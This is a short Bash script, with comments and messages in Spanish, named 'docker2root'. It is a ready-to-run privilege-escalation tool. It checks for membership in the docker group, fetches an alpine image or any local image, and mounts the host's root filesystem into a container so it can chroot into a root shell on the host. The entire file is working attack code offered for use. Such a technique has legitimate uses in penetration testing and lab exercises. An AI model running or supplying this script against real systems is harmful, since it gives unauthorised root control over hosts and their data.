#!/bin/bash

# =========================================================
# docker2root
# Autor: Carlos Martín
# =========================================================
#
# Descripción:
# Herramienta para escalar privilegios cuando el usuario 
# pertenece al grupo docker.
#
# Uso:
# chmod +x docker2root
# ./docker2root
#
# =========================================================

echo "[+] docker2root"
echo

echo "[+] Comprobando si Docker existe..."
command -v docker >/dev/null 2>&1 || {
  echo "[-] Docker no está instalado o no está en el PATH."
  exit 1
}

echo "[+] Comprobando grupo docker..."
id | grep -q docker || {
  echo "[-] El usuario actual no pertenece al grupo docker."
  exit 1
}

echo "[+] Comprobando acceso al daemon Docker..."
docker ps >/dev/null 2>&1 || {
  echo "[-] No se puede acceder al daemon Docker."
  exit 1
}

echo "[+] Intentando obtener imagen alpine..."
if docker image inspect alpine >/dev/null 2>&1; then
  IMAGE="alpine"
  echo "[+] Alpine ya existe localmente."
elif docker pull alpine >/dev/null 2>&1; then
  IMAGE="alpine"
  echo "[+] Alpine descargada correctamente."
else
  echo "[!] No se pudo usar alpine."
  echo "[+] Buscando imagen local disponible..."

  IMAGE=$(docker images --format "{{.Repository}}:{{.Tag}}" | grep -v "<none>" | head -n 1)

  if [ -z "$IMAGE" ]; then
    echo "[-] No hay imágenes locales disponibles."
    exit 1
  fi

  echo "[+] Usando imagen local: $IMAGE"
fi

echo
echo "[+] Probando chroot con /bin/bash..."
docker run -it --rm -v /:/mnt "$IMAGE" chroot /mnt /bin/bash

if [ $? -ne 0 ]; then
  echo
  echo "[!] /bin/bash falló."
  echo "[+] Probando chroot con /bin/sh..."

  docker run -it --rm -v /:/mnt "$IMAGE" chroot /mnt /bin/sh
fi

if [ $? -ne 0 ]; then
  echo
  echo "[!] chroot falló."
  echo "[+] Abriendo shell del contenedor con el host montado en /mnt..."

  docker run -it --rm -v /:/mnt "$IMAGE" /bin/sh

  echo
  echo "[+] Si has entrado correctamente, prueba:"
  echo "    cd /mnt/root"
fi
